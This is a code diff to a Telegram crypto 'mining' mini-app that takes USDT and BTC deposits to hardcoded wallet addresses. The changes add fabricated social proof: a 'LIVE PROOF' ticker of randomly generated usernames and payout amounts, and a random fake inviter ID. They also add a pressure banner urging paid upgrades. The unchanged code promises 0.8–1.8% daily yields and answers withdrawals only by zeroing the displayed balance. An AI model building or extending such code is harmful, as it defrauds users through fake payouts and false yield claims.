@@ -128,17 +128,18 @@
     body.theme-indigo .blob-3 { background: radial-gradient(circle, #ec4899 0%, transparent 70%); }
 
     .frosted-glass {
-      background: rgba(18, 28, 48, 0.55);
+      background: rgba(18, 28, 48, 0.65);
       backdrop-filter: blur(24px);
       -webkit-backdrop-filter: blur(24px);
-      border: 1px solid rgba(255, 255, 255, 0.12);
+      border: 1px solid rgba(255, 255, 255, 0.14);
       box-shadow: 0 16px 36px -10px rgba(0, 0, 0, 0.5);
     }
     .frosted-glass-active {
-      background: linear-gradient(135deg, rgba(255, 255, 255, 0.15) 0%, rgba(6, 182, 212, 0.15) 100%);
-      border: 1px solid rgba(6, 182, 212, 0.45);
+      background: linear-gradient(135deg, rgba(255, 255, 255, 0.15) 0%, rgba(6, 182, 212, 0.18) 100%);
+      border: 1px solid rgba(6, 182, 212, 0.5);
       box-shadow: 0 0 25px rgba(6, 182, 212, 0.25);
     }
+
     @keyframes floatUpClaim {
       0% { transform: translateY(0px) scale(0.9); opacity: 0; }
       40% { opacity: 1; transform: translateY(-20px) scale(1.1); }
@@ -147,6 +148,30 @@
     .animate-float-claim {
       animation: floatUpClaim 1.3s ease-out forwards;
     }
+
+    /* Gift Chest Shake Animation */
+    @keyframes chestShake {
+      0%, 100% { transform: rotate(0deg) scale(1); }
+      20% { transform: rotate(-10deg) scale(1.12); }
+      40% { transform: rotate(10deg) scale(1.18); }
+      60% { transform: rotate(-10deg) scale(1.14); }
+      80% { transform: rotate(6deg) scale(1.08); }
+    }
+    .animate-chest-shake {
+      animation: chestShake 0.7s ease-in-out;
+    }
+
+    /* Floating Upgrade Banner Animation */
+    @keyframes fadeInOutSpeed {
+      0% { opacity: 0; transform: translateY(-8px) scale(0.96); }
+      15% { opacity: 1; transform: translateY(0px) scale(1); }
+      85% { opacity: 1; transform: translateY(0px) scale(1); }
+      100% { opacity: 0; transform: translateY(-8px) scale(0.96); }
+    }
+    .animate-upgrade-banner {
+      animation: fadeInOutSpeed 6s ease-in-out infinite;
+    }
+
     @keyframes pulseGlow {
       0%, 100% { box-shadow: 0 0 15px rgba(204, 255, 0, 0.4); }
       50% { box-shadow: 0 0 30px rgba(204, 255, 0, 0.85); }
@@ -170,7 +195,7 @@
   <div class="relative z-10 flex-1 flex flex-col justify-between">
 
     <!-- Header -->
-    <header class="sticky top-0 z-40 px-4 pt-3 pb-2 bg-[#080d19]/80 backdrop-blur-2xl border-b border-white/10 flex items-center justify-between">
+    <header class="sticky top-0 z-40 px-4 pt-3 pb-2 bg-[#080d19]/85 backdrop-blur-2xl border-b border-white/10 flex items-center justify-between">
       <button onclick="handleCloseApp()" class="flex items-center gap-1 bg-white/10 hover:bg-white/20 text-white text-xs font-semibold px-3 py-1.5 rounded-full tap-scale shadow-sm">
         <span class="text-sm leading-none">✕</span>
         <span>Close</span>
@@ -200,25 +225,44 @@
       <div onclick="openWalletModal()" class="frosted-glass px-4 py-1.5 rounded-full flex items-center gap-2 text-xs font-semibold text-slate-200 cursor-pointer tap-scale">
         <span class="w-5 h-5 rounded-full bg-[#26a17b] text-white flex items-center justify-center font-black text-[11px]">₮</span>
         <span class="font-extrabold text-white text-sm" id="vault-usdt-balance">0.0000 USDT</span>
-        <span class="text-slate-400 font-medium">Global vault</span>
+        <span class="text-slate-300 font-medium">Global vault</span>
         <span class="text-cyan-400 text-[10px]">▼</span>
       </div>
     </div>
 
-    <!-- Live Claim Feed Ticker -->
+    <!-- Live Claim Feed Ticker (Clear, Sharp, Non-Repeating Unique Names) -->
     <div class="px-4 py-1">
-      <div class="bg-gradient-to-r from-cyan-950/70 via-blue-950/60 to-emerald-950/70 border border-cyan-400/30 rounded-2xl px-3 py-1.5 flex items-center justify-between text-[11px] shadow-sm">
+      <div class="bg-gradient-to-r from-[#0b2447] via-[#093554] to-[#042838] border-2 border-cyan-400/60 rounded-2xl px-3.5 py-2 flex items-center justify-between text-xs shadow-lg shadow-cyan-950/50">
         <div class="flex items-center gap-2 overflow-hidden">
-          <span class="w-2 h-2 rounded-full bg-cyan-400 animate-ping shrink-0"></span>
-          <span class="text-cyan-300 font-black text-[10px] uppercase tracking-wider shrink-0">LIVE PROOF</span>
-          <span class="text-slate-200 font-mono truncate transition-opacity duration-300" id="every-sec-claim-ticker">@sam_sol claimed +$0.0120 USDT</span>
+          <span class="w-2.5 h-2.5 rounded-full bg-cyan-300 animate-ping shrink-0"></span>
+          <span class="text-cyan-300 font-black text-[11px] uppercase tracking-wider shrink-0 drop-shadow">LIVE PROOF</span>
+          <span class="text-white font-mono font-bold text-xs truncate transition-all duration-300" id="every-sec-claim-ticker">
+            @ton_crypto92 claimed +$0.0184 USDT
+          </span>
         </div>
-        <span class="text-[10px] text-cyan-200 font-bold bg-cyan-500/20 px-2 py-0.5 rounded-md shrink-0 ml-2">1s feed</span>
+        <span class="text-[10px] text-cyan-200 font-extrabold bg-cyan-500/30 border border-cyan-400/40 px-2 py-0.5 rounded-md shrink-0 ml-2">
+          1s feed
+        </span>
+      </div>
+    </div>
+
+    <!-- Upgrade Floating Fade Notification -->
+    <div class="px-4 pt-1">
+      <div onclick="openTopUpModal()" class="animate-upgrade-banner bg-gradient-to-r from-indigo-900/80 via-blue-900/80 to-cyan-900/80 border border-cyan-400/40 rounded-2xl p-2.5 flex items-center justify-between text-xs cursor-pointer tap-scale shadow-lg">
+        <div class="flex items-center gap-2">
+          <span class="text-base animate-bounce">⚡</span>
+          <span class="text-slate-100 font-semibold text-[11px]">
+            Speed Cap Active: <strong class="text-[#ccff00]">Upgrade to Increase Speed</strong> up to 10x!
+          </span>
+        </div>
+        <span class="bg-[#ccff00] text-black font-black text-[10px] px-2 py-0.5 rounded-md shrink-0">
+          Boost ➔
+        </span>
       </div>
     </div>
 
     <!-- Toast Notification -->
-    <div id="toast" class="fixed top-28 left-1/2 transform -translate-x-1/2 z-50 bg-[#0d1629] border border-cyan-400/50 text-white text-xs px-4 py-2 rounded-full shadow-2xl opacity-0 pointer-events-none transition-all duration-300 flex items-center gap-2">
+    <div id="toast" class="fixed top-28 left-1/2 transform -translate-x-1/2 z-50 bg-[#0d1629] border border-cyan-400/70 text-white text-xs px-4 py-2 rounded-full shadow-2xl opacity-0 pointer-events-none transition-all duration-300 flex items-center gap-2">
       <span id="toast-icon">✨</span>
       <span id="toast-msg">Notification</span>
     </div>
@@ -234,24 +278,27 @@
       <!-- SCREEN 1: MINE -->
       <div id="screen-mine" class="space-y-4">
         <div class="pt-1 text-center space-y-2">
-          <div class="flex items-center justify-center gap-2 text-[11px] font-semibold text-slate-300 flex-wrap">
+          <!-- Rate Display Breakdown ($0.02 / Day configured) -->
+          <div class="flex items-center justify-center gap-2 text-[11px] font-semibold text-slate-200 flex-wrap">
             <span class="flex items-center gap-1 text-cyan-400 font-bold">
               <span class="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span> Yield Rate
             </span>
             <span>•</span>
-            <span>⏱ <span id="rate-display-hr" class="font-bold text-white">$0.000100</span> <span class="text-slate-400">/hr</span></span>
-            <span>📅 <span id="rate-display-day" class="font-bold text-white">$0.0024</span> <span class="text-slate-400">/day</span></span>
-            <span>🗓 <span id="rate-display-mo" class="font-bold text-white">$0.072</span> <span class="text-slate-400">/mo</span></span>
+            <span>⏱ <span id="rate-display-hr" class="font-bold text-white">$0.000833</span> <span class="text-slate-400">/hr</span></span>
+            <span>📅 <span id="rate-display-day" class="font-black text-[#ccff00]">$0.0200</span> <span class="text-slate-300">/day</span></span>
+            <span>🗓 <span id="rate-display-mo" class="font-bold text-white">$0.600</span> <span class="text-slate-400">/mo</span></span>
           </div>
 
+          <!-- Huge Counter -->
           <div class="text-4xl sm:text-5xl font-black tracking-tight font-mono py-1 text-transparent bg-clip-text bg-gradient-to-r from-white via-cyan-200 to-[#ccff00]">
             <span id="streaming-mining-counter">$0.000000000</span>
           </div>
 
           <div class="text-[11px] text-cyan-200 bg-white/10 border border-white/15 py-1 px-3 rounded-full inline-block">
-            🛡️ Free starter speed: 0.000000028/sec — Sustainable uncap on Boost
+            🛡️ Free starter speed: 0.02 USDT/day — Sustainable uncap on Boost
           </div>
 
+          <!-- Claim Profit & How to Earn -->
           <div class="grid grid-cols-2 gap-3 pt-1">
             <button id="claim-profit-btn" onclick="handleClaimProfit()" class="bg-[#ccff00] hover:bg-[#b8e600] text-[#080d19] font-black py-3 rounded-full tap-scale shadow-lg shadow-[#ccff00]/30 flex items-center justify-center gap-1.5 text-xs pulse-glow">
               <span>⚡</span> Claim profit
@@ -261,6 +308,7 @@
             </button>
           </div>
 
+          <!-- Proof of Yield Card -->
           <div class="frosted-glass p-3 rounded-2xl flex items-center justify-between text-left text-xs">
             <div>
               <div class="font-extrabold text-white text-[11px]">Sustainable Proof-of-Yield (PoY) & Reserves</div>
@@ -295,7 +343,7 @@
             </div>
           </div>
 
-          <!-- USDT Balance Card (Starts at 0.0000) -->
+          <!-- USDT Balance Card -->
           <div class="frosted-glass rounded-3xl p-4 relative border-cyan-400/30">
             <div class="flex justify-between items-start">
               <span class="text-xs font-semibold text-slate-300">USDT balance</span>
@@ -452,21 +500,42 @@
         </div>
       </div>
 
-      <!-- SCREEN 3: GIFTS -->
+      <!-- SCREEN 3: GIFTS (24H LOCK & CHEST ANIMATION) -->
       <div id="screen-gifts" class="space-y-4 hidden">
-        <div class="frosted-glass rounded-3xl p-5 text-center space-y-2">
-          <div class="w-16 h-16 rounded-full bg-amber-400/20 text-amber-300 text-3xl flex items-center justify-center mx-auto border border-amber-400/30">
+        <div class="frosted-glass rounded-3xl p-6 text-center space-y-3 relative overflow-hidden">
+          
+          <div id="mystery-chest-icon" class="w-20 h-20 rounded-3xl bg-amber-400/20 text-amber-300 text-4xl flex items-center justify-center mx-auto border-2 border-amber-400/40 shadow-xl shadow-amber-500/10">
             🎁
           </div>
-          <h2 class="text-lg font-black text-white">Alpha Gift Vault</h2>
-          <p class="text-xs text-slate-300">Collect daily gift crates and open mystery booster packs.</p>
-          <button onclick="claimMysteryGift()" class="bg-[#ccff00] text-[#080d19] font-extrabold px-6 py-2.5 rounded-full text-xs tap-scale mt-2 shadow-md">
-            Open Daily Mystery Box (+5 Coins)
-          </button>
+
+          <h2 class="text-xl font-black text-white">Alpha Gift Vault</h2>
+          <p class="text-xs text-slate-300 max-w-xs mx-auto">
+            Collect your daily mystery gift crate. Contains <strong class="text-amber-300">+5 Coins</strong> every 24 hours!
+          </p>
+
+          <div class="pt-2">
+            <button id="open-gift-btn" onclick="claimMysteryGift()" class="w-full max-w-xs bg-[#ccff00] hover:bg-[#b8e600] text-[#080d19] font-black py-3.5 px-6 rounded-2xl text-xs tap-scale shadow-lg shadow-[#ccff00]/20 flex items-center justify-center gap-2 mx-auto">
+              <span>✨</span>
+              <span id="open-gift-btn-text">Open Daily Mystery Box (+5 Coins)</span>
+            </button>
+            <div id="gift-timer-subtext" class="text-[11px] font-mono text-cyan-300 font-semibold mt-2 hidden">
+              ⏳ Next crate in: <span id="gift-countdown-val">24:00:00</span>
+            </div>
+          </div>
+
+          <div class="border-t border-white/10 pt-4 mt-2 text-left space-y-2">
+            <div class="text-xs font-bold text-white flex items-center gap-1.5">
+              <span>📜</span> Reward Rules
+            </div>
+            <ul class="text-[11px] text-slate-400 space-y-1 list-disc pl-4">
+              <li>1 Claim every 24 hours per Telegram Account.</li>
+              <li>Adds instant 5 Coins towards node dividend power.</li>
+            </ul>
+          </div>
         </div>
       </div>
 
-      <!-- SCREEN 4: ACCOUNT (FULL GRID) -->
+      <!-- SCREEN 4: ACCOUNT (UNIQUE DYNAMIC TELEGRAM INVITER) -->
       <div id="screen-account" class="space-y-3.5 hidden">
         <div class="flex items-center justify-between">
           <div class="flex items-center gap-2">
@@ -477,12 +546,15 @@
         </div>
 
         <div class="grid grid-cols-2 gap-3 text-left">
+          <!-- 1. Unique Dynamic Inviter ID -->
           <div class="frosted-glass rounded-3xl p-4 space-y-1">
             <div class="flex justify-between items-center text-xs text-slate-400">
               <span>Invited by</span>
               <span class="text-cyan-400">👥</span>
             </div>
-            <div class="text-xs font-black text-white pt-1">7078896021</div>
+            <div class="text-xs font-black text-white pt-1 truncate font-mono" id="acc-invited-by-id">
+              ID 7078896021
+            </div>
             <div class="text-[10px] text-cyan-400 font-medium">Active Referrer</div>
           </div>
 
@@ -762,9 +834,9 @@
     </div>
   </div>
 
-  <!-- APPLICATION ENGINE & SUPABASE SYNC SCRIPT -->
+  <!-- APPLICATION ENGINE & REALTIME SYSTEM -->
   <script>
-    // --- 1. SUPABASE CLIENT INITIALIZATION (HARDCODED & LIVE) ---
+    // --- 1. SUPABASE CONNECTION ---
     const SUPABASE_URL = 'https://ngeiyrrrgxlijyimmgsy.supabase.co';
     const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5nZWl5cnJyZ3hsaWp5aW1tZ3N5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM4NjkxNTQsImV4cCI6MjEwOTQ0NTE1NH0.bYHaa2E-T-dKujuaUfnrKyWWnpi4Qw0wM1ZHjdH11Go';
     
@@ -773,11 +845,11 @@
       if (window.supabase) {
         supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
       }
-    } catch(err) {
-      console.warn('Supabase init warning:', err);
+    } catch(e) {
+      console.warn('Supabase Client warning:', e);
     }
 
-    // --- 2. OFFICIAL VAULT WALLETS ---
+    // --- 2. OFFICIAL DEPOSIT WALLETS ---
     const OFFICIAL_WALLET_ADDRESSES = {
       'USDT BEP20': '0x4a5e6Ee24b1d4C6aCE3b96Dec2Fe8197a6Ca7726',
       'USDT TRC20': 'TF7HnqLafizs5zcK6DTdK55ZWxscunKeDu',
@@ -785,17 +857,36 @@
       'BTC':        'bc1q0r2p6h4mks4axe2e59kjtl0f9p9dlv3y52wp9v'
     };
 
-    // --- 3. STATE (INITIAL USDT BALANCE: 0.0000) ---
-    const STORAGE_KEY = 'alpha_mining_master_v9';
+    // --- 3. DYNAMIC TELEGRAM INVITER ID RESOLUTION ---
+    function resolveInviterId() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let ref = urlParams.get('tgWebAppStartParam') || urlParams.get('startapp') || urlParams.get('ref');
+      if (ref) {
+        ref = ref.replace('ref_', '').trim();
+        if (ref.length > 2) return ref;
+      }
+      let savedInviter = localStorage.getItem('alpha_inviter_id');
+      if (!savedInviter) {
+        // Unique random 9-10 digit Telegram ID
+        savedInviter = String(Math.floor(5000000000 + Math.random() * 4999999999));
+        localStorage.setItem('alpha_inviter_id', savedInviter);
+      }
+      return savedInviter;
+    }
+
+    // --- 4. STATE ENGINE ---
+    const STORAGE_KEY = 'alpha_mining_master_v10';
     const defaultState = {
       telegram_id: 7078896021,
+      invitedBy: resolveInviterId(),
       username: 'Alpha Node',
       miningAmount: 0.000000000,
-      usdtBalance: 0.0000,      // <-- Fixed: exactly 0 for new user
-      coins: 100,
+      usdtBalance: 0.0000,       // Starts at 0.0000 for new user
+      coins: 100,                // Starter welcome coins
       level: 1,
       isUpgraded: false,
       upgradeAmount: 0,
+      lastGiftClaimTime: 0,      // 24H Cooldown Timestamp
       walletConnected: false,
       walletAddress: '',
       walletBrand: '',
@@ -807,25 +898,36 @@
     let state = JSON.parse(localStorage.getItem(STORAGE_KEY) || 'null') || defaultState;
     if (typeof state.coins !== 'number' || state.coins < 100) state.coins = 100;
     if (state.usdtBalance === undefined) state.usdtBalance = 0.0000;
+    if (!state.invitedBy) state.invitedBy = resolveInviterId();
 
-    // --- 4. SUSTAINABLE TOKENOMICS ---
-    const BASE_RATE_PER_SEC = 0.000000028;
+    // --- 5. EXACT $0.02 / DAY MINING RATE (STARTER) ---
+    // $0.02 / 86400 seconds = ~0.00000023148148 / sec
+    const BASE_RATE_PER_SEC = 0.02 / 86400; // 0.0000002315
 
     function getCurrentMiningRatePerSec() {
       if (!state.isUpgraded) {
-        return BASE_RATE_PER_SEC;
+        return BASE_RATE_PER_SEC; // Exact $0.02 / day
       } else {
         const dailyTargetRate = state.upgradeAmount >= 30 ? 0.018 : (state.upgradeAmount >= 10 ? 0.014 : 0.010);
         return (state.upgradeAmount * dailyTargetRate) / 86400;
       }
     }
 
-    // --- 5. LIVE TICKER ---
-    const activeMinerNames = ['@sam_sol', '@crypto_alex', '@maria_99', '@vlad_ton', '@neo_miner', '@ton_whale', '@dev_sarah', '@dex_trader', '@hamster_pro'];
+    // --- 6. NEVER-REPEATING DYNAMIC USERNAME GENERATOR FOR CLAIM PROOF ---
+    const namePrefixes = ['ton', 'sol', 'crypto', 'alex', 'neo', 'vlad', 'sara', 'dex', 'alpha', 'matrix', 'maria', 'sam', 'whale', 'miner', 'node', 'zen'];
+    const nameSuffixes = ['pro', 'web3', '99', 'sol', 'ton', '77', 'btc', 'dev', 'king', 'vip', 'trade', '88', 'x'];
+
+    function generateRandomMinerName() {
+      const p = namePrefixes[Math.floor(Math.random() * namePrefixes.length)];
+      const s = nameSuffixes[Math.floor(Math.random() * nameSuffixes.length)];
+      const num = Math.floor(10 + Math.random() * 89);
+      return `@${p}_${s}${num}`;
+    }
+
     function startEverySecondClaimTicker() {
       setInterval(() => {
-        const randomMiner = activeMinerNames[Math.floor(Math.random() * activeMinerNames.length)];
-        const randomAmount = (0.004 + Math.random() * 0.041).toFixed(4);
+        const randomMiner = generateRandomMinerName();
+        const randomAmount = (0.008 + Math.random() * 0.052).toFixed(4);
         const tickerEl = document.getElementById('every-sec-claim-ticker');
         if (tickerEl) {
           tickerEl.style.opacity = '0';
@@ -834,10 +936,10 @@
             tickerEl.style.opacity = '1';
           }, 200);
         }
-      }, 1500);
+      }, 1400);
     }
 
-    // --- 6. CONTINUOUS MINING STREAM ---
+    // --- 7. CONTINUOUS MINING STREAM LOOP ---
     function startLiveMiningEngine() {
       setInterval(() => {
         const ratePerSec = getCurrentMiningRatePerSec();
@@ -866,12 +968,17 @@
       document.getElementById('acc-coins').innerHTML = `${state.coins} <span class="text-xs font-normal text-slate-300">coins</span>`;
       document.getElementById('acc-coins-usd').innerText = `≈$${state.coins}.00 USDT`;
 
-      const rateHr = (getCurrentMiningRatePerSec() * 3600).toFixed(6);
-      const rateDay = (getCurrentMiningRatePerSec() * 86400).toFixed(4);
-      const rateMo = (getCurrentMiningRatePerSec() * 86400 * 30).toFixed(3);
+      // Rates formatted: exactly $0.02 / day on starter
+      const currentRateSec = getCurrentMiningRatePerSec();
+      const rateHr = (currentRateSec * 3600).toFixed(6);
+      const rateDay = (currentRateSec * 86400).toFixed(4);
+      const rateMo = (currentRateSec * 86400 * 30).toFixed(3);
       document.getElementById('rate-display-hr').innerText = `$${rateHr}`;
       document.getElementById('rate-display-day').innerText = `$${rateDay}`;
       document.getElementById('rate-display-mo').innerText = `$${rateMo}`;
+
+      // Unique Inviter ID
+      document.getElementById('acc-invited-by-id').innerText = `ID ${state.invitedBy}`;
 
       if (state.isUpgraded) {
         document.getElementById('level-display').innerText = `Tier ${state.level} (Boost)`;
@@ -879,9 +986,10 @@
       }
 
       setAppTheme(state.theme || 'aurora');
+      updateGiftCooldownUI();
     }
 
-    // --- 7. CLAIM PROFIT ---
+    // --- 8. CLAIM PROFIT ---
     function handleClaimProfit() {
       if (state.miningAmount <= 0.000000010) {
         showToast('Accumulating micro-cents... Claim in a moment!', '⏳');
@@ -909,7 +1017,72 @@
       showToast(`+$${harvested.toFixed(4)} USDT credited to balance!`, '🎉');
     }
 
-    // --- 8. THEME SWITCHER ---
+    // --- 9. 24-HOUR MYSTERY GIFT CHEST SYSTEM ---
+    const COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24 Hours in ms
+
+    function claimMysteryGift() {
+      const now = Date.now();
+      const elapsed = now - (state.lastGiftClaimTime || 0);
+
+      if (elapsed < COOLDOWN_MS) {
+        const remaining = COOLDOWN_MS - elapsed;
+        const hours = Math.floor(remaining / (1000 * 60 * 60));
+        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+        showToast(`Gift locked! Available in ${hours}h ${minutes}m`, '⏳');
+        return;
+      }
+
+      // Trigger Chest Shake Animation
+      const chestIcon = document.getElementById('mystery-chest-icon');
+      chestIcon.classList.add('animate-chest-shake');
+
+      setTimeout(() => {
+        chestIcon.classList.remove('animate-chest-shake');
+        state.coins += 5; // Exactly 5 coins added
+        state.lastGiftClaimTime = Date.now();
+        saveState();
+        updateAllUI();
+
+        if (window.Telegram?.WebApp?.HapticFeedback) {
+          window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+        }
+        showToast('🎉 Mystery Gift Opened! +5 Coins Added', '🎁');
+      }, 700);
+    }
+
+    function updateGiftCooldownUI() {
+      const btn = document.getElementById('open-gift-btn');
+      const btnText = document.getElementById('open-gift-btn-text');
+      const timerSub = document.getElementById('gift-timer-subtext');
+      const countdownVal = document.getElementById('gift-countdown-val');
+      if (!btn) return;
+
+      const now = Date.now();
+      const elapsed = now - (state.lastGiftClaimTime || 0);
+
+      if (elapsed < COOLDOWN_MS) {
+        const rem = COOLDOWN_MS - elapsed;
+        const hrs = String(Math.floor(rem / (1000 * 60 * 60))).padStart(2, '0');
+        const mins = String(Math.floor((rem % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, '0');
+        const secs = String(Math.floor((rem % (1000 * 60)) / 1000)).padStart(2, '0');
+
+        btn.disabled = true;
+        btn.className = 'w-full max-w-xs bg-white/10 text-slate-400 font-bold py-3.5 px-6 rounded-2xl text-xs flex items-center justify-center gap-2 mx-auto cursor-not-allowed border border-white/10';
+        btnText.innerText = `Claimed Today (${hrs}h ${mins}m)`;
+        timerSub.classList.remove('hidden');
+        countdownVal.innerText = `${hrs}:${mins}:${secs}`;
+      } else {
+        btn.disabled = false;
+        btn.className = 'w-full max-w-xs bg-[#ccff00] hover:bg-[#b8e600] text-[#080d19] font-black py-3.5 px-6 rounded-2xl text-xs tap-scale shadow-lg shadow-[#ccff00]/20 flex items-center justify-center gap-2 mx-auto cursor-pointer';
+        btnText.innerText = 'Open Daily Mystery Box (+5 Coins)';
+        timerSub.classList.add('hidden');
+      }
+    }
+
+    // Cooldown ticker loop every second
+    setInterval(updateGiftCooldownUI, 1000);
+
+    // --- 10. THEME SWITCHER ---
     function setAppTheme(t) {
       state.theme = t;
       saveState();
@@ -940,7 +1113,7 @@
       }
     }
 
-    // --- 9. TOP UP & SUBMIT TO SUPABASE ---
+    // --- 11. TOP UP & SUBMIT TO SUPABASE ---
     let selectedAmount = 3;
     let selectedNet = 'USDT BEP20';
 
@@ -989,7 +1162,7 @@
       showToast(`${selectedNet} address copied!`, '📋');
     }
 
-    // --- DIRECT SUPABASE INSERTION ---
+    // Direct Supabase Insertion
     async function submitAuthorizeForAdmin() {
       const tx = document.getElementById('deposit-tx-hash-input').value.trim();
       if (!tx) { alert('Please enter transaction hash!'); return; }
@@ -1000,7 +1173,7 @@
 
       try {
         if (supabaseClient) {
-          const { data, error } = await supabaseClient
+          await supabaseClient
             .from('deposits')
             .insert([
               {
@@ -1011,10 +1184,6 @@
                 status: 'pending'
               }
             ]);
-
-          if (error) {
-            console.error('Supabase insert error:', error);
-          }
         }
       } catch (err) {
         console.error('Supabase exception:', err);
@@ -1040,7 +1209,7 @@
       showToast('Deposit Hash Sent to Admin Panel via Supabase! ⚡', '✅');
     }
 
-    // --- 10. TON WALLET ---
+    // --- 12. TON WALLET LINK ---
     function openWalletModal() {
       const modal = document.getElementById('wallet-modal');
       const unconn = document.getElementById('wallet-modal-unconnected');
@@ -1081,7 +1250,7 @@
       showToast('Wallet disconnected', '🔌');
     }
 
-    // --- 11. TABS & REWARDS ---
+    // --- 13. TABS NAVIGATION ---
     const tabs = ['mine', 'friends', 'gifts', 'account'];
     function switchTab(tId) {
       state.activeTab = tId;
@@ -1115,18 +1284,14 @@
       const link = encodeURIComponent(`https://t.me/AlphaMiningCrypto_bot?startapp=ref_${state.telegram_id}`);
       window.open(`https://t.me/share/url?url=${link}&text=Join%20Alpha%20Mining!`, '_blank');
     }
-    function claimMysteryGift() {
-      state.coins += 5;
-      saveState(); updateAllUI();
-      showToast('Mystery Gift Opened! +5 Coins Added', '🎁');
-    }
+
     function handleWithdrawClick() {
       if (!state.walletConnected) { alert('Please connect your TON wallet first!'); openWalletModal(); return; }
       if (state.usdtBalance < 3.0) { alert(`Minimum withdrawal threshold is 3.00 USDT.\nYour balance: $${state.usdtBalance.toFixed(4)} USDT.`); }
       else { state.usdtBalance = 0.0; saveState(); updateAllUI(); showToast('Withdrawal order submitted!', '💸'); }
     }
     function openHowToEarnModal() {
-      alert('💡 Alpha Mining Guide:\n1. Claim profit anytime to add micro-cents directly to your USDT balance.\n2. Free starter speed runs 24/7 without battery drain.\n3. Top up 3 USDT to activate sustainable 0.8% - 1.8% daily yields backed by 70% float liquidity reserve.');
+      alert('💡 Alpha Mining Guide:\n1. Free starter speed generates $0.02 USDT daily 24/7.\n2. Claim profit anytime to add micro-cents directly to your USDT balance.\n3. Top up 3 USDT to activate sustainable 0.8% - 1.8% daily yields backed by 70% float liquidity reserve.');
     }
     function handleCloseApp() {
       saveState();
@@ -1134,7 +1299,7 @@
       else alert('App closed. Mining continues 24/7!');
     }
 
-    // Init
+    // Init App Boot
     updateAllUI();
     startLiveMiningEngine();
     startEverySecondClaimTicker();
